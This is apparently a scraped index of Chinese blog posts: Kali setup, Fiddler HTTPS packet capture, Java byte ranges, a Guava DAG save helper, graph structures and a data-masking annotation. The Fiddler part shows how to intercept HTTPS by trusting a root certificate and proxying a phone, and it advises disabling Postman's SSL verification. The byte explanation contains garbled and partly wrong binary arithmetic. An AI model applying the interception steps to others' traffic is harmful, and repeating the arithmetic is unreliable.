","date":"2025-05-23","objectID":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/:2:2","tags":["kali"],"title":"Kali简介与安装","uri":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"},{"categories":["网络安全"],"content":"切换桌面 Kali中提供了2个版本的桌面，分别是Xfce和GNOME，Xfce是默认的桌面，如果不喜欢可以切换到Gnome桌面 apt install kali-desktop-gnome 中国开源： deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 官方源： deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib ","date":"2025-05-23","objectID":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/:2:3","tags":["kali"],"title":"Kali简介与安装","uri":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"},{"categories":["网络安全"],"content":"fiddler简介 Fiddler 是一款强大的抓包工具，原理是以 web 代理服务器的形式进行工作的: 下载地址： Fiddler 下载 ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:1:0","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"配置 ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:2:0","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"允许监听https Fiddler 如果抓取 https 协议会话需要进一步配置，在 Tools -\u003eOptions 菜单下，选择HTTPS标签并配置如下： 步骤： Tools -\u003e Options -\u003e HTTPS -\u003e 勾选 Decrypt HTTPS traffic 点击 Actions -\u003e Trust Root Certificate -\u003e 选择 Yes ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:2:1","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"允许远程连接 手机抓取需要配置远程连接，在 Tools -\u003eOptions 菜单下，选择Connections标签并配置如下： 监听端口 8888 并允许远程连接 ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:2:2","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"手机配置 需要电脑与手机处于同一网段（例如同一局域网） ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:3:0","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"下载证书 打开手机浏览器，输入 http://【fiddler电脑IP地址】:【fiddler设置的端口号】，例如 http://192.168.123.100:8888 可以下载证书并安装。在打开的页面中，点击 FiddlerRoot certificate 下载证书，点击允许 ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:3:1","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"安装证书 有的手机可以直接点击已下载的文件进行安装，有的手机则不行。 如果不能直接安装证书，我们可以通过以下方法来安装证书。 1.Android：安装证书。由于安装系统众多，设置的方法不尽相同，下面几个方法以供参考。 方法一：手机——设置——搜索【证书】二字——选择：安装证书或者证书管理：点击安装证书，在你的众多文件里面去选择刚刚下载的fiddler的证书，点击安装 （注：选择安装的文件后，需要输入手机的锁屏密码。Android一定要有锁屏密码才能安装证书） ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:3:2","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"配置代理 配置手机无线信号的代理 设置——无线网络（WLAN）——WLAN——长按已连接的WiFi 去修改网络——在高级选项里面——选择【手动代理】——出现以下界面，按图所示操作即可。 此时操作浏览器或APP，在 fiddler 中可以看到完成的请求和响应数据： ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:3:3","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"其他 ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:4:0","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"数据筛选 点击右侧 Filters -\u003e 勾选 Use Filters Hosts 下面，第一个选项：空间过滤；第二个选项：主机名过滤 空间过滤 ：区分内网跟外网 No Zone Filter：不通过空间进行过滤 show only Intranet Hosts: 内网 show only Internet Hosts: 外网 主机名过滤 ： No Host Filter：不通过主机名过滤 Hide the following Hosts：隐藏下边输入的主机名的请求 Show only the following Hosts：只显示下边输入的主机名的请求 Flag the following Hosts：标记下边输入的要过来的主机名的请求，黑色粗体标记 筛选指定主机名： -No Host Filter- 选择 Show only the following Hosts 输入框输入要筛选的主机名：如 www.baidu.com，多个 Host 时用分号分隔，输入框为黄色代表未保存 Actions -\u003e Run Filterset now：马上执行过滤 其他过滤方法 ： ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:4:1","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"展示接口的响应时间 1、直接点击接口查看接口响应时间 2、新增一列展示接口响应时间 Rules-\u003eCustomize Rules… -\u003e 搜索：class Handlers // 显示每行请求的服务端耗时时间 public static BindUIColumn(\"Time Taken\", 80) function CalcTimingCol(oS: Session){ var sResult = \"0\"; if ((oS.Timers.ServerDoneResponse \u003e oS.Timers.ClientDoneRequest)) { sResult = (oS.Timers.ServerDoneResponse - oS.Timers.ClientDoneRequest).TotalMilliseconds.ToString(\"N0\"); } return sResult + \"ms\"; } 保存，重新打开 fiddler 就能看到每个请求的耗时了。单位毫秒 ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:4:2","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"http请求的host参数为 Tunnel to fiddler 做代理转发 https 请求时，就会产生：CONNECT Tunnels，可以不管它。 ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:4:3","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"开启 Fiddler 后 Postman 无法发起请求 Postman关闭 SSL 设置 ：Settings -\u003e General -\u003e 关闭：SSL certificate verification ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:4:4","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["网络安全"],"content":"图标含义 官方文档 ","date":"2025-05-22","objectID":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/:4:5","tags":["Fiddler"],"title":"Fiddler如何实现抓包","uri":"/posts/fiddler%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8C%85/"},{"categories":["java"],"content":"一个字节是8个比特位，int类型有4个字节，也就是有32个比特位。 ","date":"2025-05-20","objectID":"/posts/byte%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4%E4%B8%BA%E5%95%A5%E6%98%AF-128~127/:0:0","tags":[],"title":"byte类型取值范围为啥是-128~127","uri":"/posts/byte%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4%E4%B8%BA%E5%95%A5%E6%98%AF-128~127/"},{"categories":["java"],"content":"基本数据类型： 1 基本类型：byte 二进制位数：8 一个字节8个bit位 2 包装类：java.lang.Byte 3 最小值：Byte.MIN_VALUE=-128 4 最大值：Byte.MAX_VALUE=127 1 基本类型：short 二进制位数：16 2 包装类：java.lang.Short 3 最小值：Short.MIN_VALUE=-32768 4 最大值：Short.MAX_VALUE=32767 1 基本类型：int 二进制位数：32 2 包装类：java.lang.Integer 3 最小值：Integer.MIN_VALUE=-2147483648 4 最大值：Integer.MAX_VALUE=2147483647 1 基本类型：long 二进制位数：64 2 包装类：java.lang.Long 3 最小值：Long.MIN_VALUE=-9223372036854775808 4 最大值：Long.MAX_VALUE=9223372036854775807 1 基本类型：float 二进制位数：32 2 包装类：java.lang.Float 3 最小值：Float.MIN_VALUE=1.4E-45 4 最大值：Float.MAX_VALUE=3.4028235E38 1 基本类型：double 二进制位数：64 2 包装类：java.lang.Double 3 最小值：Double.MIN_VALUE=4.9E-324 4 最大值：Double.MAX_VALUE=1.7976931348623157E308 1 基本类型：char 二进制位数：16 2 包装类：java.lang.Character 3 最小值：Character.MIN_VALUE=0 4 最大值：Character.MAX_VALUE=65535 ","date":"2025-05-20","objectID":"/posts/byte%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4%E4%B8%BA%E5%95%A5%E6%98%AF-128~127/:0:1","tags":[],"title":"byte类型取值范围为啥是-128~127","uri":"/posts/byte%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4%E4%B8%BA%E5%95%A5%E6%98%AF-128~127/"},{"categories":["java"],"content":"我们来看看为啥byte的取值范围是-128~127 我们都知道，1个byte占8个bit位，二进制为表示10100000，其中首位(最高位)是符号位，剩下的是数值位，所以能表示byte数值的只有7位，那么它的最大值很容易的用二进制表示为：1111111计算得到26+25+24+23+22+21+20 = 127,由于首位是符号位，所以很容易地得出byte的取值范围是-127~127，也就是1111 1111 ~ 0111 1111,那么-128是怎么来的呢？ 计算机底层定义了 0000 0000 就是0. 原码、反码、补码的出现是为了方便计算机表示、计算负数参与的加减法运算。因此，原码，反码，补码是机器存储一个具体数字的编码方式。 原码: 在数值前直接加一符号位的表示法，对于8位二进制来说： [+7]原= 0 0000111 [-7]原= 1 0000111 反码: 正数的反码与原码相同;负数的反码,符号位为“1”,数值部分按位取反。 [+7]反= 0 0000111 [-7]反= 1 1111000 补码: 正数的补码和原码相同;负数的补码则是符号位为“1”,数值部分按位取反后再在末位(最低位)加1，也就是“反码+1”。 [+7]补= 0 0000111 [-7]补= 1 1111001 其中正整数的原码、反码和补码都一样; 负数部分： 原码和反码的相互转换：符号位不变，数值位按位取反; 原码和补码的相互转换：符号位不变，数值位按位取反,末位再加1; 已知补码，求原码的负数的补码：符号位和数值位都取反，末位再加1。 那为什么会有反码和补码呢？ 计算机没有减法器，只有加法器，所以只能做加法 可以用负数代替减法 原因： 8位二进制（有符号）的取值范围是-128127的原因：在计算机中0是由0000 0000存储的，对于正数0000 00010111 1111(1127).对于负数1000 00011111 1111（-1~-127）.那么唯独只剩1000 0000（指-0）我们就把1000 0000作为-128.用1000 0000作为-128而不是128的原因是： 如果作为+128，+128的表示方法为01000 0000（原码反码补码均是），位数明显超过了8.所以要舍去一位，最高位代表的符号位是必选的。其他数值位则从低到高选取后7位，则成为0000 0000与1000 0000 并不符。 如果作为-128，-128的表示方法是11000 0000（原码），10111 1111（反码），11000 0000（补码），同样的要舍去以为那么舍去后的原码反码补码分别为：1000 0000，1111 1111，1000 0000.所以用1000 0000（-0）来代表-128.（但实际上-128是11000 0000）. -128的源码反码补码为1000 0000，1111 1111，1000 0000实际上是根据上面的运算得出来的。其实-128只有补码，原码反码代表的是-0的原码反码。但是真正做运算时某某1000 0000来做的。例如用-128+1： -128的补码：1000 0000 1的补码： 0000 0001 运算结果 1000 0001（补码） 1000 0001是-127的反码，所以在正常情况下运算是正确的，加减运算时要避免溢出。 ","date":"2025-05-20","objectID":"/posts/byte%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4%E4%B8%BA%E5%95%A5%E6%98%AF-128~127/:0:2","tags":[],"title":"byte类型取值范围为啥是-128~127","uri":"/posts/byte%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4%E4%B8%BA%E5%95%A5%E6%98%AF-128~127/"},{"categories":["Java后端"],"content":"项目背景 某系统中需要实现点击保存按钮，依次保存上下游依赖数据，依赖关系不严格，循环里面实现了依次保存，但数据量大之后性能问题严重 ","date":"2024-08-02","objectID":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/:1:0","tags":[],"title":"kd-使用有向无环图表示任务的依赖关系","uri":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/"},{"categories":["Java后端"],"content":"解决方案 通过图技术实现数据上下游依赖关系，多线程执行数据保存操作，图构建了数据之间的依赖关系，每次保存入度为0的数据块。 ","date":"2024-08-02","objectID":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/:2:0","tags":[],"title":"kd-使用有向无环图表示任务的依赖关系","uri":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/"},{"categories":["Java后端"],"content":"代码实现 \u003cdependency\u003e \u003cgroupId\u003ecom.google.guava\u003c/groupId\u003e \u003cartifactId\u003eguava\u003c/artifactId\u003e \u003cversion\u003e23.0\u003c/version\u003e \u003c/dependency\u003e import java.util.ArrayList; import java.util.List; import java.util.Map; import java.util.Set; import java.util.concurrent.CompletableFuture; import java.util.concurrent.ExecutionException; import java.util.concurrent.ExecutorService; import java.util.function.Consumer; import java.util.stream.Collectors; import com.google.common.graph.GraphBuilder; import com.google.common.graph.MutableGraph; public class GraphHelper { /** * EXECUTORSERVICE 线程池执行器 */ private static final ExecutorService EXECUTORSERVICE = ThreadPools.newCachedExecutorService( \"CrlListBillCfgGraphHelper.runTask4Graph\", Runtime.getRuntime().availableProcessors() * 2, Math.max(Runtime.getRuntime().availableProcessors() * 2, 20)); /** * 通过配置信息创建图结构:所有页签图 * @param mainTabPageKeys 子页面标识 */ public static MutableGraph\u003cString\u003e creatGraph4CfgItem(Set\u003cString\u003e mainTabPageKeys){ //所有配置信息 Map\u003cString, CrlListBillTabCfgPO\u003e allListCfgData = CrlListBillCfgHelper.getAllListCfgData(); //配置信息图 MutableGraph\u003cString\u003e cfgGraph = GraphBuilder.directed() //指定为有向图 // .nodeOrder(ElementOrder.\u003cInteger\u003einsertion()) //节点按插入顺序输出 //(还可以取值无序unordered()、节点类型的自然顺序natural()) .expectedNodeCount(mainTabPageKeys.size()) //预期节点数 // .allowsSelfLoops(true) //允许自环 .build(); if(mainTabPageKeys.isEmpty() || allListCfgData.isEmpty()){ return cfgGraph; } //1.先创建节点:每个页签一个节点 mainTabPageKeys.forEach(cfgGraph::addNode); //2.先创建边：根据页签依赖关系创建边 for(String mainTabPageKey : mainTabPageKeys){ //页签配置信息 CrlListBillTabCfgPO crlListBillTabCfgPO = allListCfgData.get(mainTabPageKey); if(null == crlListBillTabCfgPO){ continue; } //页签对象 CrlListCfgItemPO tab = crlListBillTabCfgPO.getTab(); if(null == tab){ continue; } //依赖信息 List\u003cString\u003e dependtabs = tab.getDependtabs(); if(null == dependtabs){ continue; } //创建边 dependtabs.forEach(node -\u003e { //只处理已经启用的依赖页签 if(mainTabPageKeys.contains(node)){ cfgGraph.putEdge(node,mainTabPageKey); } }); } return cf","date":"2024-08-02","objectID":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/:3:0","tags":[],"title":"kd-使用有向无环图表示任务的依赖关系","uri":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/"},{"categories":["Java后端"],"content":"技术拓展 ","date":"2024-08-02","objectID":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/:4:0","tags":[],"title":"kd-使用有向无环图表示任务的依赖关系","uri":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/"},{"categories":["Java后端"],"content":"图（graph） 1.1图的概念 图的构成： 将图G抽象的表示为一组顶点V和一组边E的集合。eg:一个包含5个顶点和7条边的图。 V={1,2,3,4,5} E={(1,2),(1,3),(1,5),(2,3),(2,4),(4,5)} G={V,E} 可以将图看作一种从链表拓展而来的数据结构 链表、树、图之间的关系: 图的分类： 图常用术语 1.邻接（adjacency）:当两顶点之间存在边相连时，称这两顶点“邻接\". 如上图顶点 1 的邻接顶点为顶点 2、3、5。 2.路径（path）:从顶点 A 到顶点 B 经过的边构成的序列被称为从 A 到 B 的“路径”.如上图：边序列 1-5-2-4 是顶点 1 到顶点 4 的一条路径。 3.度（degree）:一个顶点拥有的边数.对于有向图，入度 (in-degree)表示有多少条边指向该顶点，出度 (out-degree)表示有多少条边从该顶点指出。 图的表示 图的常见应用： 顶点 边 图计算问题 社交网络 用户 好友关系 潜在好友推荐 地铁线路 站点 站点之间的连通性 最短路线推荐 太阳系 星体 星体间的万有引力作用 行星轨道计算 1.2 图的基础操作 图的操作分为对 “边\"的操作和对“顶点”的操作 基于邻接矩阵的实现 基于邻接表的实现 代码实现： package com.datastructure; import java.util.ArrayList; import java.util.List; /** * 顶点类 */ public class Vertex { public int val; public Vertex(int val){ this.val=val; } /** * 输入值列表vals,返回顶点列表vets */ public static Vertex[] valsToVets(int[] vals){ Vertex[] vets=new Vertex[vals.length]; for(int i=0;i\u003cvals.length;i++){ vets[i]=new Vertex(vals[i]); } return vets; } /** * 输入顶点列表vets,返回值列表vals */ public static List\u003cInteger\u003e vetsToVals(List\u003cVertex\u003e vets){ List\u003cInteger\u003e vals=new ArrayList\u003c\u003e(); for(Vertex vet:vets){ vals.add(vet.val); } return vals; } } package com.datastructure; import java.util.ArrayList; import java.util.HashMap; import java.util.List; import java.util.Map; /** * 1.基于邻接矩阵实现无向图： * 添加或删除边:直接在邻接矩阵中修改指定的边，使用O(1)时间。由于是无向图，需要同时修改两个方向的边。 * 添加顶点:在邻接矩阵的尾部添加一行一列，并全部填0,使用O(n)时间。 * 删除顶点:在邻接矩阵中删除一行一列.当删除首行首列时达到最差情况，需要将(n-1)^2个元素“向左上移动”,使用O(n^2)时间 * 初始化:传入n个顶点,初始化长度为n的顶点列表vertices,使用O(n)时间;初始化nxn大小的邻接矩阵adjMat,使用O(n^2)时间 * * */ public class GraphAdjacencyMatrix { List\u003cInteger\u003e vertices;//顶点列表，元素代表\"顶点值\",索引代表\"顶点索引\" List\u003cList\u003cInteger\u003e\u003e adjMat;//邻接矩阵，行列索引对应“顶点索引\" public GraphAdjacencyMatrix(int[] vertices,int[][]edges){ this.vertices=new ArrayList\u003c\u003e(); this.adjMat=new ArrayList\u003c\u003e(); //添加顶点 for(int val:vertices){ addVertex(val); } //添加边，edges元素代表顶点索引，即对应vertices元素索引 for(int[] e:edges){ addEdge(e[0],e[1]); } } /** * 获取顶点数量 */ public int size(){ return vertices.size(); } /** * 添加顶点 */ public void addVertex(int val){ int n=size();","date":"2024-08-02","objectID":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/:4:1","tags":[],"title":"kd-使用有向无环图表示任务的依赖关系","uri":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/"},{"categories":["Java后端"],"content":"总结： 邻接矩阵利用矩阵来表示图，每一行（列）代表一个顶点，矩阵元素代表边，用 1 或 0 表示两个顶点之间有边或无边 从算法思想的角度分析，邻接矩阵体现了“以空间换时间”，邻接表体现了“以时间换空间 图的广度优先遍历是一种由近及远、层层扩张的搜索方式，通常借助队列实现。 图的深度优先遍历是一种优先走到底、无路可走时再回溯的搜索方式，常基于递归来实现。 ————————————————技术扩展来源———————————————— 版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。 原文链接：https://blog.csdn.net/crazy123456789/article/details/135955173 ","date":"2024-08-02","objectID":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/:4:2","tags":[],"title":"kd-使用有向无环图表示任务的依赖关系","uri":"/posts/kd-%E4%BD%BF%E7%94%A8%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE%E8%A1%A8%E7%A4%BA%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB/"},{"categories":["Java后端"],"content":"1.背景 在当下互联网高速发展的时代下，涉及到用户的隐私数据安全越发重要，一旦泄露将造成不可估量的后果。所以现在的业务系统开发中都会对用户隐私数据加密之后存储落库，同时还要求后端返回数据给前台之前进行数据脱敏。所谓脱敏处理其实就是将数据进行混淆隐藏，如将用户的手机号脱敏展示为`178****5939，采用 * 进行隐藏，以免泄露个人隐私信息。其实我之前就总结过相关联的功能实现：《实现数据加密存储、模糊匹配和脱敏》 但是强调一下今天这里并不是重复再讲一遍，而是在之前总结的基础上进行延伸拓展，重点在于标题里的：动态灵活可配置。那什么是动态灵活可配置呢？且听我娓娓道来。 那是一个惬意的下午时光，我听着歌，敲着一手代码……，突然间产品就来到我桌前，打断了我短暂的文思泉涌高光时刻，企图给我安排一个折磨的活，打开了奶茶app，暗示没有一杯奶茶解决不了的需求。是的最后这活我接了，也就是我们今天所要讲的数据脱敏由之前的前端脱敏改为后端，当然脱敏功能本身并不复杂难实现，那为啥说它是折磨人的活呢？普通的脱敏功能大概是这样的，也就是脱敏上面所说的用户固定隐私数据：姓名、手机号、身份证号、地址、身份证...等，但是我们的系统需求要求不只是前面的字段，还需要支持其他字段，一句话生动形象地总结概括就是客户想脱啥就脱啥，想在哪脱就在哪脱，包括我们系统支持的自定义字段，都可以通过配置进行脱敏，如下图所示： 由图可知，这个脱敏需求功能涉及到以下几点： ① 哪些字段可以脱敏是可配置的，脱敏规则也是可配置的，比如说什么开头、中间、结尾，区间啥的。 ② 脱敏设计到组织架构过滤，也就是说需要实现某个部门下的用户看到的数据是脱敏的，某个部门下的用户看到的数据是不脱敏的。这感觉就像后端接口功能菜单权限检验，判断当前用户是否有调用某个功能菜单接口的权限。 ③ 涉及到角色的判断，某些角色需要脱敏(小喽啰不给看，防止把客户数据卖了~)，而某些角色不需要(管理员随便看，随便卖~)。 这里我们暂且不讨论脱敏功能这么设计是否合理，反正产品是这样要求实现的，按照上面的列出来的点感觉也还好，也不至于上升到折磨的程度，折磨的是系统的历史原因，要脱敏的字段信息遍布都整个业务系统表单，每个表单的接口数据有冗余的有共用的，这就意味着每个页面表单接口都需要去梳理一遍。同时脱敏字段还涉及到编辑更新功能，而且之前的更新接口都是一个表单整体提交，这就导致一个脱敏字段没有修改，但是前端把脱敏数据传回后端来，又是一个一个去适配啊~~~，难顶。闹骚发完了，言归正传我们接下来看看是如何优雅地实现这个难顶的功能需求。 ","date":"2024-05-14","objectID":"/posts/%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E5%AE%9E%E7%8E%B0%E6%83%B3%E5%9C%A8%E5%93%AA%E8%84%B1%E5%B0%B1%E5%9C%A8%E5%93%AA%E8%84%B1%E6%83%B3%E8%84%B1%E8%B0%81%E5%B0%B1%E8%84%B1%E8%B0%81/:1:0","tags":[],"title":"数据脱敏实现：想在哪脱就在哪脱，想脱谁就脱谁！！！","uri":"/posts/%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E5%AE%9E%E7%8E%B0%E6%83%B3%E5%9C%A8%E5%93%AA%E8%84%B1%E5%B0%B1%E5%9C%A8%E5%93%AA%E8%84%B1%E6%83%B3%E8%84%B1%E8%B0%81%E5%B0%B1%E8%84%B1%E8%B0%81/"},{"categories":["Java后端"],"content":"2.实现思路 所谓”优雅“，就是多写一行代码都算我输…..，所以在接口controller层返回之前一个一个地进行脱敏操作是不可取的，重复的工作量太多。思来想去，肯定是需要通过切面思想去解决，也就是通过对接口返回的VO类需要脱敏的字段使用注解打上标识，然后切面统一逻辑处理，这时候想到之前总结的接口响应结果结构统一封装返回：@ControllerAdvice， 不清楚的可跳转：《Spring Boot如何优雅实现结果统一封装和异常统一处理》自行查看，但我们发现使用@ControllerAdvice意味着每次调接口都需要我们自己去反射类获取注解判断字段是否需要脱敏，当返回对象比较复杂，需要递归去反射，性能一下子就会降低。反射这个东西确实是框架的灵魂，但是在业务接口中用多了也的确对性能有一定影响，所以再三斟酌于是换种了中思路，我们想到了平时使用的@JsonFormat，跟我们现在的需求功能场景很类似，通过自定义注解跟字段解析器，对字段进行自定义解析。 @JsonFormat(pattern = \"yyyy-MM-dd\") private Date recycleDate; 这样就可以把字段recycleDate转换为日期格式，不需要我们单独代码处理，这就是优雅！！！按照这个思路，我们首先需要定义一个注解进行脱敏字段标注： @Retention(RetentionPolicy.RUNTIME) @JacksonAnnotationsInside @JsonSerialize(using = MaskSerializer.class) public @interface MaskField { /** * 脱敏类型 * @return */ MaskEnum value(); } 这个注解很简单，只有一个默认属性value()指定字段的脱敏枚举类型MaskEnum @Retention(RetentionPolicy.RUNTIME)：运行时生效。 @Target(ElementType.FIELD)：可用在字段上。 @JacksonAnnotationsInside：此注解可以点进去看一下是一个元注解，主要是用户打包其他注解一起使用。 @JsonSerialize(using = 